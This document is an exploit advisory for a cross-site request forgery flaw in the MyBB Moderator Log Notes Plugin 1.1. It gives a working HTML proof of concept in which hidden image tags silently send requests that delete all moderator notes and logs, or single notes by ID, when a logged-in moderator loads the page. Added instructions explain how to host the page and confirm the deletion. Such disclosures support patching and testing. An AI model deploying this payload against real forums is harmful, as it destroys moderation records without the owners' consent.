# Exploit Title: MyBB Moderator Log Notes Plugin 1.1 - Cross-Site Request Forgery
# Date: 2018-05-17
# Author: 0xB9
# Twitter: @0xB9Sec
# Software Link: https://community.mybb.com/mods.php?action=view&pid=1105
# Version: 1.1
# Tested on: Ubuntu 18.04

# 1. Description:
# The plugin allows moderators to save notes and display them in a list in the modCP.
# The CSRF allows an attacker to remotely delete all mod notes and mod note logs 
# in the modCP & ACP.

# 2. Proof of Concept:

<html>
	<body>
		<-- Deletes mod note logs -->
		<img style="display:none" src="http://localhost/mybb15/admin/index.php?module=tools-modnoteslog&action=dal" alt="">
		<-- Deletes mod notes -->
		<img style="display:none" src="http://localhost/mybb15/admin/index.php?module=tools-modnoteslog&action=dmn" alt="">
		
		<!-- You can also delete notes individually by the nid (note ID)
		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=3" alt="">
		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=2" alt="">
		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=1" alt="">
		-->
	</body>
</html>



Instructions: 

Set Up Test Environment:

Ensure MyBB and the Moderator Log Notes Plugin are installed on your test server (e.g., localhost/mybb15).
Make sure that you are logged in as a moderator with the ability to view and manage mod notes.


Save the HTML code above as csrf_exploit.html.
Host this HTML file on a web server (you can use a simple HTTP server like python -m http.server for local testing).

Open the csrf_exploit.html file in a web browser where a moderator is logged into the MyBB forum.
The crafted requests will automatically be sent to the MyBB server, performing actions to delete mod notes and logs.

Log in to the MyBB forum as a moderator.
Check the mod notes and logs to confirm that they have been deleted as a result of the CSRF attack.